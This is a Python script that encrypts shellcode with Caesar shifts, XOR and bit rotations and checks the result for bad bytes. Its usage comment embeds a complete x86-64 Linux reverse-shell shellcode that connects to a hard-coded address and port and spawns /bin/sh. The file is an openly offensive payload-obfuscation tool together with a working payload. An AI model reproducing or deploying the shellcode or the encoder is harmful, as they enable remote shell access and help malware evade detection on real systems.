#!/usr/bin/env python3
#encoding: UTF-8

#############################
######## DESCRIPTION ########
#############################

#Python program to automatically encrypt a shellcode

#############################
########### USAGE ###########
#############################

#./cipherShellcode --shellcode <aShellcode> --cesarKey1 <theFirstCesarKey> --cesarKey2 <theSecondCesarKey> --XOR <theXORKey> --ROL1 <theFirstBitShiftKey> --ROL2 <theSecondBitShiftKey>
#./cipherShellcode.py --shellcode \x68\x7f\x01\x0a\x64\x66\x68\x7a\x69\x66\x6a\x02\x48\x31\xd2\x48\x31\xf6\x40\xb6\x01\x48\x31\xff\x40\xb7\x02\x48\x31\xc0\xb0\x29\x0f\x05\x48\x31\xd2\xb2\x11\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xc0\xb0\x2a\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x40\xfe\xc6\xb0\x21\x0f\x05\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x31\xd2\x48\x8d\x3c\x24\x48\x31\xc0\xb0\x3b\x0f\x05 --cesarKey1 13 --XOR 7 --cesarKey2 18 --ROL1 3 --ROL2 5

#############################
########## PROGRAM ##########
#############################

import sys
import argparse

verificator = 0
encryptedShellcode = []

rol = lambda aValue, aBitShift, aMaxBits=8: (aValue << aBitShift % aMaxBits) & (2 ** aMaxBits - 1) | ((aValue & (2 ** aMaxBits - 1)) >> (aMaxBits - (aBitShift % aMaxBits))) 

parser = argparse.ArgumentParser()
parser.add_argument("--shellcode", help="The shellcode", required=True)
parser.add_argument("--XOR", help="The XOR key", type=int, required=True)
parser.add_argument("--cesarKey1", help="The first cesar key", type=int, required=True)
parser.add_argument("--cesarKey2", help="The second cesar key", type=int, required=True)
parser.add_argument("--ROL1", help="The first bit shift key", type=int, required=True)
parser.add_argument("--ROL2", help="The second bit shift key", type=int, required=True)
args = parser.parse_args()

shellcodeSplitted = args.shellcode.split("x")[1:]

for i in range(len(shellcodeSplitted)):
	verificator = verificator + 1

	if verificator == 1:
		encryptedShellcode.append(hex((int(shellcodeSplitted[i], 16) + args.cesarKey1) % 0x100))
	elif verificator == 2:
		encryptedShellcode.append((hex(int(shellcodeSplitted[i], 16) ^ args.XOR)))
	else:
		encryptedShellcode.append(hex((int(shellcodeSplitted[i], 16) - args.cesarKey2) % 0x100))
		verificator = 0

for i in range(len(encryptedShellcode)):
	if i % 2 == 0:
		encryptedShellcode[i] = hex(rol(int(encryptedShellcode[i], 16), args.ROL1))
	else:
		encryptedShellcode[i] = hex(rol(int(encryptedShellcode[i], 16), args.ROL2))

for i in range(len(encryptedShellcode)):
	if len(encryptedShellcode[i]) == 3:
		encryptedShellcode[i] = "\\x0" + encryptedShellcode[i][-1]
	else:
		encryptedShellcode[i] = "\\x" + encryptedShellcode[i][-2::]

	if encryptedShellcode[i] in ["\\x00", "\\x0a"]:
		print("\n" + "Error : Badchar detected", file=sys.stderr)
		sys.exit(1)

print("\n" + "The encrypted shellcode : {anEncryptedShellcode}".format(anEncryptedShellcode="".join(encryptedShellcode)))
